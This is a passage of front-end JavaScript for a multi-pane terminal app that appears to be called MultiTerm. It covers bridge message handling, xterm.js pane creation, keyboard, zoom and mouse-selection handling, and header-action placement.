      const withEnter = terminal.pendingCommandEnter;
      terminal.pendingCommand = null;
      if (pending) {
        window.setTimeout(() => sendBridge({ type: "input", id: terminal.id, data: `${pending}${withEnter ? "\r" : ""}` }), 500);
      }
    }
    if (terminal.pendingPaste) {
      const pending = terminal.pendingPaste;
      const withEnter = terminal.pendingPasteEnter;
      terminal.pendingPaste = null;
      terminal.pendingPasteEnter = false;
      window.setTimeout(() => {
        const liveTerminal = state.terminals.get(terminal.id);
        if (liveTerminal?.status === "live") {
          pasteIntoSpecificTerminal(liveTerminal, pending);
          if (withEnter) scheduleTerminalEnter(liveTerminal);
        }
      }, 500);
    }
    if (terminal.pendingCopilotYolo) {
      terminal.pendingCopilotYolo = false;
      window.setTimeout(() => {
        const liveTerminal = state.terminals.get(terminal.id);
        if (liveTerminal?.status === "live") invokeCopilotCli(liveTerminal);
      }, 500);
    }
    if (terminal.pendingHandoff) {
      const pendingHandoff = terminal.pendingHandoff;
      terminal.pendingHandoff = null;
      const source = state.terminals.get(pendingHandoff.sourceId);
      if (source?.status === "live") {
        addTerminalLink(source.id, terminal.id, { handoffEnabled: true });
        sendTerminalHandoff(source, terminal, pendingHandoff.payload);
      }
    }
    scheduleAutomaticQueueCheck(terminal, 150);
    scheduleTerminalHandoffDelivery(terminal, 150);
    return;
  }

  if (message.type === "output") {
    const terminal = state.terminals.get(message.id);
    if (terminal) {
      enqueueTerminalOutput(terminal, message.data);
    }
    return;
  }

  if (message.type === "logStarted") {
    const terminal = state.terminals.get(message.id);
    if (terminal) {
      terminal.logging = true;
      terminal.logPath = message.path;
    }
    toast(`Logging to ${message.path}`, "success", 3600);
    return;
  }

  if (message.type === "logStopped") {
    const terminal = state.terminals.get(message.id);
    if (terminal) terminal.logging = false;
    toast("Logging stopped", "info", 2000);
    return;
  }

  if (message.type === "logError") {
    toast(message.message || "Logging failed", "error");
    return;
  }

  if (message.type === "revealError") {
    toast(message.message || "Could not open folder", "error");
    return;
  }

  if (message.type === "openError") {
    toast(message.message || "Could not open file", "error");
    return;
  }

  if (message.type === "elevateStarted") {
    toast(`Launching elevated ${message.shell || "terminal"}\u2014approve the UAC prompt`, "info", 2800);
    return;
  }

  if (message.type === "elevateError") {
    const terminal = message.id ? state.terminals.get(message.id) : null;
    if (terminal) {
      terminal.status = "error";
      setTerminalStatus(terminal, "error", "dead");
      writelnTerminal(terminal, `\x1b[31m${message.message || "Administrator terminal failed to launch."}\x1b[0m`);
      log.error("session", `Administrator terminal failed: ${message.message || "unknown"}`, { id: message.id });
    }
    toast(message.message || "Could not open administrator terminal", "error");
    return;
  }

  if (message.type === "memstats") {
    updateMemStatus(message);
    return;
  }

  if (message.type === "config") {
    log.debug("bridge", "Bridge output batching applied", { outputCoalesceMs: message.outputCoalesceMs });
    return;
  }

  // An older bridge that predates on-demand memory stats rejects the probe with
  // a generic "Unsupported message type: memstats" error. That frame carries no
  // id, so without this guard it would fall through to the bridge-error branch
  // below and repaint the whole bridge status as offline every few seconds while
  // the memory chip is open. Treat it as "capability unavailable" instead so the
  // feature degrades quietly against bridges that don't speak memstats.
  if (message.type === "error" && /Unsupported message type:\s*memstats/i.test(message.message || "")) {
    updateMemStatus({ supported: false, reason: "bridge" });
    return;
  }

  // Same contract for output batching: an installed bridge that predates it keeps
  // sending one frame per pty chunk, which still works.
  if (message.type === "error" && /Unsupported message type:\s*config/i.test(message.message || "")) {
    log.debug("bridge", "Bridge does not support output batching; using per-chunk delivery");
    return;
  }

  if (message.type === "error" && /Unsupported message type:\s*statistics/i.test(message.message || "")) {
    const terminalScope = Boolean(state.statistics.terminalId);
    resolveBridgeRequestByType("statistics", {
      type: "statistics",
      scope: terminalScope ? "terminal" : "all",
      requestedId: state.statistics.terminalId,
      supported: false,
      processError: "Statistics are unavailable in this installed bridge. Update or reinstall MultiTerm to enable them.",
      sessions: [],
      totals: {}
    });
    return;
  }

  if (message.type === "exited") {
    const terminal = state.terminals.get(message.id);
    if (!terminal) return;
    terminal.status = "exited";
    terminal.logging = false;
    setTerminalStatus(terminal, "exited", "dead");
    setAwaitingInput(terminal, false);
    removeTerminalLinksForSession(message.id);
    orphanTerminalArtifacts(terminal, "process exited");
    log.info("session", `Session exited: ${terminal.titleInput.value}`, { id: message.id, code: message.code ?? message.signal ?? "closed" });
    writelnTerminal(terminal, "");
    writelnTerminal(terminal, `\x1b[31mSession exited (${message.code ?? message.signal ?? "closed"}).\x1b[0m`);
    toast(`${terminal.titleInput.value} exited`, "info", 2600);
    return;
  }

  if (message.type === "createFailed" || message.type === "error") {
    const terminal = state.terminals.get(message.id);
    if (terminal) {
      log.error("session", `Session error: ${message.message || "unknown"}`, { id: message.id });
      writelnTerminal(terminal, `\x1b[31m${message.message}\x1b[0m`);
      setTerminalStatus(terminal, "error", "dead");
      if (message.type === "createFailed") orphanTerminalArtifacts(terminal, "session failed to start");
      toast(message.message || "Session error", "error");
    } else {
      log.error("bridge", `Bridge error: ${message.message || "unknown"}`);
      setBridgeStatus(message.message || "Bridge error", "offline");
    }
  }
}

function openFolderInNewTerminal(folder) {
  if (typeof folder !== "string" || !folder.trim()) return null;
  // The request came from Explorer or VS Code, so the window that answers it has
  // to come forward or the click looks like it did nothing.
  focusAppWindow();
  return addTerminal({
    reveal: true,
    runStartup: true,
    cwd: folder.trim()
  });
}

// After an auto-reconnect the bridge re-announces sessions it kept alive. Mark
// a terminal we already hold as live again so it resumes streaming output and
// its status reflects reality instead of the stale "offline" from the drop.
function reattachExistingSession(terminal, session) {
  terminal.remoteRequested = true;
  terminal.status = "live";
  if (session.cwd) terminal.cwd = session.cwd;
  if (session.pid != null) terminal.pid = session.pid;
  // The shell kept running across the drop, so its original launch time is still
  // the truth — take the bridge's copy rather than treating this as a new start.
  if (session.startedAt) terminal.startedAt = session.startedAt;
  if (session.tmux) terminal.tmux = session.tmux;
  syncTerminalArtifacts(terminal);
  setTerminalStatus(terminal, session.pid != null ? `pid ${session.pid}` : "live", "live");
  updateTerminalSearchVisibility(terminal);
  scheduleFit(terminal);
  scheduleTerminalConnections();
  log.info("session", `Session reattached: ${terminal.titleInput.value}`, { id: terminal.id, pid: session.pid });
}

// A terminal that was live before the drop but is absent from the bridge's
// session list after reconnect exited while we were offline.
function markSessionLostWhileOffline(terminal) {
  if (terminal.status === "exited") return;
  terminal.status = "exited";
  terminal.logging = false;
  setTerminalStatus(terminal, "exited", "dead");
  setAwaitingInput(terminal, false);
  removeTerminalLinksForSession(terminal.id);
  orphanTerminalArtifacts(terminal, "process ended while disconnected");
  writelnTerminal(terminal, "");
  writelnTerminal(terminal, "\x1b[31mSession ended while the bridge was disconnected.\x1b[0m");
  log.info("session", `Session lost while offline: ${terminal.titleInput.value}`, { id: terminal.id });
}

function terminalShellTitle(shell) {
  const value = String(shell || "").trim().toLowerCase();
  if (value === "cmd" || value === "cmd.exe" || value === "command prompt") return "Command Prompt";
  if (value === "powershell" || value === "powershell.exe" || value === "windows powershell") return "Windows PowerShell";
  if (value === "wsl" || value === "wsl.exe") return "WSL";
  return "PowerShell";
}

// Each label keeps its own sequence, so the first WSL pane is "WSL 1" even when
// PowerShell panes already exist. Reuses gaps left by closed terminals.
function nextTitleForLabel(label) {
  const prefix = `${label} `;
  const used = new Set();
  for (const terminal of state.terminals.values()) {
    const value = String(terminal.titleInput?.value || "");
    if (!value.startsWith(prefix)) continue;
    const suffix = value.slice(prefix.length);
    if (/^\d+$/.test(suffix)) used.add(Number(suffix));
  }
  let index = 1;
  while (used.has(index)) index += 1;
  return `${label} ${index}`;
}

function nextTerminalTitle(shell) {
  return nextTitleForLabel(terminalShellTitle(shell));
}

function addTerminal(options = {}) {
  if (options.reveal) {
    clearTerminalSearch();
    // A user-requested terminal must be visible immediately. A pane-level zoom
    // hides every sibling, including a newly appended pane, so leave the
    // transient maximized view before creating anything the user asked to see.
    if (state.zoomedId) {
      state.zoomedId = null;
      applyZoom();
    }
  }

  const session = options.session || {};
  const savedMeta = options.savedMeta || null;
  const id = session.id || createId();
  const shell = options.shell || session.shell || elements.shellSelect.value;
  const title = savedMeta?.title || session.title || options.title || nextTerminalTitle(shell);
  const rawFontSizeOverride = savedMeta?.fontSizeOverride ?? options.fontSizeOverride;
  const fontSizeOverride = Number.isFinite(Number(rawFontSizeOverride))
    ? Math.min(MAX_FONT_SIZE, Math.max(MIN_FONT_SIZE, Math.round(Number(rawFontSizeOverride))))
    : null;
  const pane = elements.paneTemplate.content.firstElementChild.cloneNode(true);
  const screen = pane.querySelector(".terminal-screen");
  const titleInput = pane.querySelector(".pane-title");
  const titleDisplay = pane.querySelector(".pane-title-display");
  const status = pane.querySelector(".pane-status");
  const term = new Terminal({
    allowProposedApi: true,
    allowTransparency: false,
    convertEol: false,
    cursorBlink: state.settings.cursorBlink,
    cursorStyle: state.settings.cursorStyle,
    fontFamily: fontStacks[state.settings.fontFamily] || fontStacks["Cascadia Mono"],
    fontSize: fontSizeOverride ?? state.settings.fontSize,
    scrollback: effectiveScrollback(),
    tabStopWidth: 4,
    theme: themes[state.settings.theme]
  });
  const fitAddon = new FitAddon.FitAddon();

  term.loadAddon(fitAddon);

  let searchAddon = null;
  if (window.SearchAddon?.SearchAddon) {
    searchAddon = new SearchAddon.SearchAddon();
    term.loadAddon(searchAddon);
  }
  if (window.WebLinksAddon?.WebLinksAddon) {
    term.loadAddon(new WebLinksAddon.WebLinksAddon((event, uri) => window.open(uri, "_blank")));
  }

  titleInput.value = title;
  titleDisplay.textContent = title;
  pane.dataset.id = id;
  const elevated = Boolean(options.elevated || session.elevated);
  if (elevated) {
    pane.dataset.elevated = "true";
    const headerIcon = pane.querySelector(".pane-title-wrap i[data-lucide]");
    if (headerIcon) headerIcon.dataset.lucide = "shield";
  }
  elements.host.append(pane);
  term.open(screen);

  const fontZoomIndicator = document.createElement("span");
  fontZoomIndicator.className = "terminal-zoom-indicator";
  fontZoomIndicator.setAttribute("aria-hidden", "true");
  screen.append(fontZoomIndicator);

  const terminal = {
    color: savedMeta?.color || options.color || session.color || null,
    copilotCwd: normalizeCopilotCwdEntry(savedMeta?.copilotCwd ?? options.copilotCwd),
    contextSelection: "",
    createdAt: performance.now(),
    cwd: session.cwd || options.cwd || elements.cwdInput.value,
    awaitingInput: false,
    autoQueueCompletionMarker: "",
    autoQueueDispatching: false,
    autoQueueOutputEvidence: "",
    autoQueueRequiredRevision: 0,
    autoQueueTimer: 0,
    copilotTuiDetected: false,
    elevated,
    fitAddon,
    fontSizeOverride,
    headerActionOverrides: normalizeHeaderActionOverrides(savedMeta?.headerActionOverrides ?? options.headerActionOverrides),
    fontZoomIndicator,
    fontZoomIndicatorTimer: 0,
    fontZoomWheelDelta: 0,
    id,
    handoffDispatching: false,
    handoffDeliveryTimer: 0,
    handoffRequiresCopilot: options.pendingHandoff?.requireCopilot === true,
    handoffScanTimer: 0,
    lastHandoffRow: -1,
    logging: false,
    logPath: null,
    minimized: false,
    modifyOtherKeys: 0,
    notificationOverrides: normalizeNotificationOverrides(savedMeta?.notificationOverrides ?? options.notificationOverrides),
    observer: null,
    pane,
    pendingCopilotYolo: Boolean(options.pendingCopilotYolo),
    pendingCommand: typeof options.pendingCommand === "string" ? options.pendingCommand : null,
    pendingCommandEnter: options.pendingCommandEnter !== false,
    pendingPaste: typeof options.pendingPaste === "string" ? options.pendingPaste : null,
    pendingPasteEnter: Boolean(options.pendingPasteEnter),
    pendingHandoff: options.pendingHandoff && typeof options.pendingHandoff === "object" ? options.pendingHandoff : null,
    pendingOutput: [],
    pendingOutputBytes: 0,
    outputFlushHandle: 0,
    outputFlushTimer: 0,
    outputRevision: 0,
    fitScheduled: false,
    lastSentCols: 0,
    lastSentRows: 0,
    pid: session.pid,
    pageId: resolvePageId(savedMeta?.pageId || options.pageId || session.pageId, id),
    remoteRequested: Boolean(options.reattach),
    runStartup: Boolean(options.runStartup),
    searchAddon,
    searchText: "",
    searchTextStale: false,
    selectionSnapshotPosition: null,
    selectionSnapshot: "",
    webglAddon: null,
    webglLossTimes: [],
    webglRecoveryHandle: 0,
    screen,
    shell,
    startedAt: session.startedAt || null,
    status: options.reattach ? "live" : "starting",
    statusElement: status,
    term,
    titleDisplay,
    titleInput,
    tmux: options.tmux || session.tmux || null
  };

  terminal.observer = new ResizeObserver(() => {
    updatePaneDensity(terminal);
    scheduleFit(terminal);
    scheduleTerminalConnections();
  });
  state.terminals.set(id, terminal);
  ensureTerminalAnalyticsRecord(terminal);
  syncTerminalArtifacts(terminal);
  updateTerminalActions();
  terminal.observer.observe(screen);
  terminal.observer.observe(pane);
  bindPaneControls(terminal);
  applyHeaderActionPlacement(terminal);
  updateTerminalNotificationButton(terminal);
  bindPaneDrag(terminal);
  bindPaneResize(terminal);
  bindPaneQuickQueue(terminal);
  bindTerminalHandoffGrips(terminal);
  bindPaneFind(terminal);
  applyPaneColor(terminal);
  if (terminal.elevated) pane.classList.add("is-admin");
  applyManualLayout(terminal, ensureManualLayout(id));
  // Panes for other pages are hidden immediately so a reattached session never
  // flashes onto the page you are looking at.
  pane.classList.toggle("is-page-hidden", terminal.pageId !== state.activePageId);
  rebalanceWebglRenderers();
  renderPager();
  saveTerminalPages();
  if (isOnActivePage(terminal)) setActiveTerminal(id);
  refreshIcons(pane);
  bindTerminalKeyHandling(terminal);
  bindTerminalFontZoom(terminal);
  bindTerminalSelectionHandling(terminal);
  registerCwdTracking(terminal);
  registerModifiedKeyReporting(terminal);

  term.onData((data) => {
    if (!data) return;
    if (terminal.targetedPasteCapture) {
      terminal.targetedPasteCapture.push(data);
      return;
    }
    // Merely clicking away from a terminal blocked on a prompt would otherwise
    // clear its awaiting flag, erasing the indicator meant to call you back.
    const isUserInput = !FOCUS_REPORT_SEQUENCE.test(data);
    const clearsSelection = isUserInput && !MOUSE_REPORT_SEQUENCE.test(data);
    const targets = terminal.targetedPaste
      ? [id]
      : state.settings.syncInput
        ? [...state.terminals.keys()]
        : [id];
    let sentToAllTargets = true;
    for (const targetId of targets) {
      const target = state.terminals.get(targetId);
      if (target && isUserInput) {
        if (clearsSelection) forgetTerminalSelection(target);
        setAwaitingInput(target, false);
      }
      sentToAllTargets = sendBridge({ type: "input", id: targetId, data }) && sentToAllTargets;
    }
    if (terminal.targetedPaste) {
      terminal.targetedPasteObserved = true;
      terminal.targetedPasteSent = terminal.targetedPasteSent && sentToAllTargets;
    }
  });

  term.onKey(() => recordTerminalAnalyticsKeystroke(terminal));

  term.onResize(({ cols, rows }) => {
    queueResize(terminal, cols, rows);
  });

  term.onBell(() => handleBell(terminal));

  term.onSelectionChange(() => {
    const selection = term.getSelection();
    if (selection) {
      terminal.selectionSnapshot = selection;
      terminal.selectionSnapshotPosition = term.getSelectionPosition() || null;
    } else if (terminal.selectionSnapshot && terminal.selectionSnapshotPosition) {
      // Full-screen TUIs redraw frequently and xterm clears its live selection
      // during some buffer updates. Restore after that update completes so a
      // mouse selection remains visible until the user clicks or types.
      window.queueMicrotask(() => restoreTerminalSelection(terminal));
    }

    if (selection && state.settings.copyOnSelect) {
      writeClipboardText(selection).catch((error) => {
        log.warn("clipboard", "Copy-on-select failed", { error: String(error?.message || error) });
      });
    }
  });

  screen.addEventListener("mousedown", (event) => {
    if (event.button === 1) {
      event.preventDefault();
      pasteIntoTerminal(id);
    }
  });

  term.element?.addEventListener("focusin", () => {
    setActiveTerminal(id);
    beginTerminalAnalyticsFocus(terminal);
  });
  term.element?.addEventListener("focusout", () => {
    window.setTimeout(() => {
      if (!terminal.term.element?.contains(document.activeElement)) endTerminalAnalyticsFocus(id);
    }, 0);
  });
  pane.addEventListener("pointerdown", (event) => {
    // Controls own their click behavior. Terminal/chrome presses only change the
    // keyboard-active pane; the explicit Focus action owns primary-pane promotion.
    if (event.target.closest("button, select, input, a, [contenteditable]")) return;
    setActiveTerminal(id);
  });
  pane.addEventListener("pointerup", () => syncManualLayout(terminal));

  // Keep keyboard focus in sync with the pane the user clicks. Clicking a pane's
  // CHROME — its header bar, terminal padding, or screen gaps — does not move DOM
  // focus into the terminal by itself. The browser instead blurs the previously
  // focused terminal to <body>, so keystrokes can silently vanish.
  // Intercept a primary-button mousedown on non-interactive chrome, cancel the
  // default focus shift, and focus THIS pane's terminal so typing always lands
  // in the pane that was just clicked. Clicks on the xterm surface and on
  // interactive controls (title field, buttons, selects) are left untouched so
  // xterm keeps managing its own focus/selection and controls stay usable.
  pane.addEventListener("mousedown", (event) => {
    if (event.button !== 0) return;
    if (event.target.closest("button, select, input, textarea, a, [contenteditable]")) return;
    if (event.target.closest(".xterm")) return;
    event.preventDefault();
    term.focus();
  });

  if (options.reattach) {
    setTerminalStatus(terminal, session.pid ? `pid ${session.pid}` : "live", "live");
    writelnTerminal(terminal, "\x1b[36mReattached to running session.\x1b[0m");
    log.info("terminal", `Reattached terminal: ${terminal.titleInput.value}`, { id, shell: terminal.shell });
  } else {
    requestSession(terminal);
    log.info("terminal", `Terminal added: ${terminal.titleInput.value}`, { id, shell: terminal.shell || elements.shellSelect.value });
  }

  refreshTerminalSearchText(terminal);
  applySettings();
  revealTerminal(terminal);
  scheduleFit(terminal);
  if (terminal.status === "live") scheduleAutomaticQueueCheck(terminal, 150);
  saveSessionSnapshot();
  return terminal;
}

function bindTerminalKeyHandling(terminal) {
  terminal.term.element?.addEventListener("keydown", (event) => {
    if (event.ctrlKey && !event.altKey && !event.metaKey && !event.shiftKey && event.code === "KeyA") {
      event.preventDefault();
      event.stopPropagation();
      terminal.term.selectAll();
      return;
    }

    if (event.ctrlKey && !event.altKey && !event.metaKey && !event.shiftKey && event.code === "KeyC") {
      event.preventDefault();
      event.stopPropagation();
      sendBridge({ type: "input", id: terminal.id, data: "\x03" });
      return;
    }

    if (state.settings.ctrlVPaste
        && event.ctrlKey && !event.altKey && !event.metaKey && !event.shiftKey
        && event.code === "KeyV") {
      event.preventDefault();
      event.stopPropagation();
      pasteIntoTerminal(terminal.id);
      return;
    }

    if (!event.ctrlKey && !event.altKey && !event.metaKey && event.code === "Tab") {
      event.preventDefault();
      event.stopPropagation();
      sendBridge({ type: "input", id: terminal.id, data: event.shiftKey ? "\x1b[Z" : "\t" });
      return;
    }

    const modifiedEnter = modifiedEnterSequence(terminal, event);
    if (modifiedEnter) {
      event.preventDefault();
      event.stopPropagation();
      sendBridge({ type: "input", id: terminal.id, data: modifiedEnter });
    }
  }, true);
}

// Ctrl+wheel is scoped by pointer position, so it can resize one terminal
// without adding another header control or another row to the context menu.
// Pixel deltas from touchpads are accumulated to avoid racing through many font
// sizes during one gesture; a traditional mouse-wheel notch crosses the same
// threshold in one event.
function bindTerminalFontZoom(terminal) {
  terminal.screen.addEventListener("wheel", (event) => {
    if (!event.ctrlKey || event.altKey || event.metaKey || event.deltaY === 0) return;
    event.preventDefault();
    event.stopPropagation();

    const scale = event.deltaMode === WheelEvent.DOM_DELTA_LINE
      ? 40
      : event.deltaMode === WheelEvent.DOM_DELTA_PAGE ? 120 : 1;
    terminal.fontZoomWheelDelta += event.deltaY * scale;
    if (Math.abs(terminal.fontZoomWheelDelta) < 80) return;

    zoomTerminalFont(terminal.id, terminal.fontZoomWheelDelta < 0 ? 1 : -1);
    terminal.fontZoomWheelDelta = 0;
  }, { capture: true, passive: false });
}

let workspaceZoomWheelDelta = 0;
let workspaceZoomIndicatorTimer = 0;

function workspaceZoomScale() {
  return normalizeWorkspaceZoom(state.settings.workspaceZoom) / 100;
}

function clearTerminalFocus() {
  if (!state.activeId && !elements.host.querySelector(".terminal-pane.is-active")) return;
  state.activeId = null;
  for (const terminal of state.terminals.values()) terminal.pane.classList.remove("is-active");
  endTerminalAnalyticsFocus();
  updateTerminalActions();
}

function focusWorkspaceBackground() {
  elements.stage.focus({ preventScroll: true });
  clearTerminalFocus();
}

function showWorkspaceZoomIndicator() {
  const indicator = elements.workspaceZoomIndicator;
  if (!indicator) return;
  window.clearTimeout(workspaceZoomIndicatorTimer);
  indicator.textContent = `${state.settings.workspaceZoom}%`;
  indicator.classList.add("is-visible");
  workspaceZoomIndicatorTimer = window.setTimeout(() => {
    indicator.classList.remove("is-visible");
    workspaceZoomIndicatorTimer = 0;
  }, 1100);
}

function setWorkspaceZoom(value, { announce = false } = {}) {
  state.settings.workspaceZoom = normalizeWorkspaceZoom(value);
  elements.workspaceZoom.value = state.settings.workspaceZoom;
  // Dragging a zoom slider relays out every pane per step, so hold the pty
  // resizes back until the gesture settles.
  noteResizeGesture();
  applySettings();
  saveSettings();
  if (announce) showWorkspaceZoomIndicator();
}

function bindWorkspaceBackgroundZoom() {
  const focusBackgroundFromPointer = (event) => {
    if (event.button !== 0) return;
    if (event.target.closest(".terminal-pane, .find-all-bar, .terminal-connector-action, .terminal-connector-hit")) return;
    event.preventDefault();
    focusWorkspaceBackground();
  };
  elements.stage.addEventListener("focus", clearTerminalFocus);
  elements.stage.addEventListener("pointerdown", focusBackgroundFromPointer);
  elements.stage.addEventListener("click", focusBackgroundFromPointer);

  elements.stage.addEventListener("wheel", (event) => {
    if (document.activeElement !== elements.stage || event.deltaY === 0) return;
    if (event.altKey || event.metaKey || event.shiftKey) return;
    event.preventDefault();
    event.stopPropagation();

    const deltaScale = event.deltaMode === WheelEvent.DOM_DELTA_LINE
      ? 40
      : event.deltaMode === WheelEvent.DOM_DELTA_PAGE ? 120 : 1;
    workspaceZoomWheelDelta += event.deltaY * deltaScale;
    if (Math.abs(workspaceZoomWheelDelta) < 80) return;
    const direction = workspaceZoomWheelDelta < 0 ? 1 : -1;
    workspaceZoomWheelDelta = 0;
    setWorkspaceZoom(state.settings.workspaceZoom + direction * WORKSPACE_ZOOM_BOUNDS.step, { announce: true });
  }, { capture: true, passive: false });
}

// A mouse-aware TUI turns on mouse tracking, and xterm then forwards every
// mouse gesture to the application instead of building a selection — so a plain
// drag highlights nothing xterm can copy, and "Copy" has no text to offer.
function mouseReportingActive(terminal) {
  const mode = terminal.term.modes?.mouseTrackingMode;
  return Boolean(mode) && mode !== "none";
}

const DRAG_SELECT_THRESHOLD_PX = 3;
const MOUSE_REPORT_SEQUENCE = /^(?:\x1b\[<\d+;\d+;\d+[mM]|\x1b\[\d+;\d+;\d+M|\x1b\[M[\s\S]{3})+$/;

function forgetTerminalSelection(terminal, clearLive = true) {
  terminal.contextSelection = "";
  terminal.selectionSnapshot = "";
  terminal.selectionSnapshotPosition = null;
  if (clearLive && terminal.term.getSelection()) terminal.term.clearSelection();
}

function restoreTerminalSelection(terminal) {
  if (terminal.term.getSelection()
      || !terminal.selectionSnapshot
      || !terminal.selectionSnapshotPosition) {
    return false;
  }
  const { start, end } = terminal.selectionSnapshotPosition;
  const length = ((end.y - start.y) * terminal.term.cols) + end.x - start.x;
  if (length <= 0) return false;
  terminal.term.select(start.x, start.y, length);
  return true;
}

function bindTerminalSelectionHandling(terminal) {
  const element = terminal.term.element;
  if (!element) return;

  bindTuiDragSelection(terminal, element);

  const captureContextSelection = () => {
    const liveSelection = terminal.term.getSelection();
    terminal.contextSelection = liveSelection
      || terminal.contextSelection
      || terminal.selectionSnapshot;
    if (!liveSelection && terminal.contextSelection) restoreTerminalSelection(terminal);
  };

  element.addEventListener("pointerdown", (event) => {
    if (event.button === 0) forgetTerminalSelection(terminal, false);
  }, true);

  const isTerminalGesture = (event) => Boolean(event.target.closest(".xterm"));
  const captureRightButton = (event) => {
    if (event.button !== 2 || !isTerminalGesture(event)) return;
    captureContextSelection();
    // Bind on the pane, which is above xterm in the capture path. Stopping at
    // xterm's own element is too late when its mouse protocol listener also runs
    // in capture phase.
    event.stopImmediatePropagation();
  };

  terminal.pane.addEventListener("pointerdown", captureRightButton, true);
  terminal.pane.addEventListener("mousedown", captureRightButton, true);

  // xterm installs its own contextmenu handler on this element. Handle the
  // gesture from the pane capture boundary so xterm cannot move/select its
  // hidden textarea (or let a mouse-aware TUI discard the selection) first.
  terminal.pane.addEventListener("contextmenu", (event) => {
    if (!isTerminalGesture(event)) return;
    captureContextSelection();
    event.preventDefault();
    event.stopImmediatePropagation();
    openTerminalContextMenu(event, terminal);
  }, true);

  element.addEventListener("pointerup", (event) => {
    if (event.button !== 0) return;
    const selection = terminal.term.getSelection();
    if (selection) {
      terminal.selectionSnapshot = selection;
      terminal.selectionSnapshotPosition = terminal.term.getSelectionPosition() || null;
    }
  }, true);
}

// Takes drag gestures back from a mouse-reporting application so text can be
// selected and copied, while a plain click is replayed to the application so its
// buttons keep working. Alt+drag opts out and hands the whole gesture over.
// Terminals without mouse reporting are left alone: xterm selects natively there.
function bindTuiDragSelection(terminal, element) {
  let drag = null;
  let replaying = false;

  const cellAt = (event) => {
    const screen = element.querySelector(".xterm-screen") || element;
    const rect = screen.getBoundingClientRect();
    const { cols, rows } = terminal.term;
    if (!rect.width || !rect.height) return { col: 0, row: terminal.term.buffer.active.viewportY };
    const col = Math.max(0, Math.min(cols - 1, Math.floor(((event.clientX - rect.left) / rect.width) * cols)));
    const row = Math.max(0, Math.min(rows - 1, Math.floor(((event.clientY - rect.top) / rect.height) * rows)));
    return { col, row: row + terminal.term.buffer.active.viewportY };
  };

  const applySelection = (gesture, event) => {
    const end = cellAt(event);
    let from = gesture.startCell;
    let to = end;
    if (to.row < from.row || (to.row === from.row && to.col < from.col)) {
      from = end;
      to = gesture.startCell;
    }
    const length = ((to.row - from.row) * terminal.term.cols) + (to.col - from.col);
    if (length > 0) terminal.term.select(from.col, from.row, length);
    else forgetTerminalSelection(terminal);
  };

  const endGesture = () => {
    drag = null;
    window.removeEventListener("mousemove", onMove, true);
    window.removeEventListener("mouseup", onUp, true);
  };

  function onMove(event) {
    if (!drag.moved) {
      const far = Math.abs(event.clientX - drag.x) >= DRAG_SELECT_THRESHOLD_PX
        || Math.abs(event.clientY - drag.y) >= DRAG_SELECT_THRESHOLD_PX;
      if (!far) return;
      drag.moved = true;
    }
    applySelection(drag, event);
    event.stopImmediatePropagation();
  }

  function onUp(event) {
    if (event.button !== 0) return;
    const gesture = drag;
    endGesture();

    if (gesture.moved) {
      applySelection(gesture, event);
      const selection = terminal.term.getSelection();
      terminal.selectionSnapshot = selection;
      terminal.selectionSnapshotPosition = selection ? (terminal.term.getSelectionPosition() || null) : null;
      event.stopImmediatePropagation();
      return;
    }

    // No movement, so this was a click and it belongs to the application. Replay
    // the press/release pair the TUI never saw.
    replaying = true;
    const target = document.elementFromPoint(gesture.x, gesture.y) || element;
    const shared = {
      bubbles: true,
      cancelable: true,
      view: window,
      button: 0,
      clientX: gesture.x,
      clientY: gesture.y,
      ctrlKey: event.ctrlKey,
      shiftKey: event.shiftKey,
      altKey: event.altKey,
      metaKey: event.metaKey
    };
    target.dispatchEvent(new MouseEvent("mousedown", { ...shared, buttons: 1 }));
    target.dispatchEvent(new MouseEvent("mouseup", { ...shared, buttons: 0 }));
    replaying = false;
  }

  // Bound on the pane because xterm's own mouse-protocol listener also runs in
  // capture phase on its element, which is too late to intercept.
  terminal.pane.addEventListener("mousedown", (event) => {
    if (replaying || event.button !== 0 || event.altKey || event.shiftKey) return;
    if (!event.target.closest(".xterm")) return;
    if (!mouseReportingActive(terminal)) return;

    drag = { startCell: cellAt(event), x: event.clientX, y: event.clientY, moved: false };
    forgetTerminalSelection(terminal);
    terminal.term.focus();
    window.addEventListener("mousemove", onMove, true);
    window.addEventListener("mouseup", onUp, true);
    event.stopImmediatePropagation();
  }, true);
}

function headerActionPlacement(terminal, action) {
  const override = terminal.headerActionOverrides[action];
  if (override) return override;
  return state.settings.headerActionsInMenu.includes(action) ? "menu" : "header";
}

function applyHeaderActionPlacement(terminal) {
  for (const action of HEADER_ACTION_IDS) {
    const button = terminal.pane.querySelector(`.pane-actions button[data-action="${action}"]`);
    if (!button) continue;
    const placement = headerActionPlacement(terminal, action);
    button.draggable = true;
    button.dataset.headerPlacement = placement;
    button.classList.toggle("is-user-menu-action", placement === "menu");
  }
}

function clearHeaderActionDragStyles() {
  for (const element of document.querySelectorAll(".is-action-dragging, .is-header-action-drop-target")) {
    element.classList.remove("is-action-dragging", "is-header-action-drop-target");
  }
}

function startHeaderActionDrag(event, terminalId, action, sourceElement) {
  if (!HEADER_ACTION_ID_SET.has(action) || !state.terminals.has(terminalId)) {
    event.preventDefault();
    return;
  }
  draggedHeaderAction = { terminalId, action };
  sourceElement.classList.add("is-action-dragging");
  if (event.dataTransfer) {
    const payload = JSON.stringify(draggedHeaderAction);
    event.dataTransfer.effectAllowed = "move";
    event.dataTransfer.setData("application/x-multiterm-header-action", payload);
    event.dataTransfer.setData("text/plain", payload);
  }
}

function finishHeaderActionDrag() {
  clearHeaderActionDragStyles();
  draggedHeaderAction = null;
}

function setHeaderActionPlacement(terminalId, action, placement, scope) {
  const terminal = state.terminals.get(terminalId);
  if (!terminal || !HEADER_ACTION_ID_SET.has(action)) return;

  if (scope === "all") {
    const menuActions = new Set(state.settings.headerActionsInMenu);
    if (placement === "menu") menuActions.add(action);
    else menuActions.delete(action);
    state.settings.headerActionsInMenu = HEADER_ACTION_IDS.filter((candidate) => menuActions.has(candidate));
    for (const current of state.terminals.values()) {
      delete current.headerActionOverrides[action];
      applyHeaderActionPlacement(current);
    }
    saveSettings();
  } else {
    const globalPlacement = state.settings.headerActionsInMenu.includes(action) ? "menu" : "header";
    if (placement === globalPlacement) delete terminal.headerActionOverrides[action];
    else terminal.headerActionOverrides[action] = placement;
    applyHeaderActionPlacement(terminal);
  }

  saveSessionSnapshot();
  const destination = placement === "menu" ? "menu" : "header";
  toast(`${HEADER_ACTIONS[action].label.replace("\u2026", "")} moved to ${destination}`, "success", 1800);
}

function closeHeaderActionScopeFlyout({ restoreFocus = false } = {}) {
  const focusTarget = pendingHeaderActionMove?.focusTarget;
  elements.headerActionScopeFlyout.hidden = true;
  pendingHeaderActionMove = null;
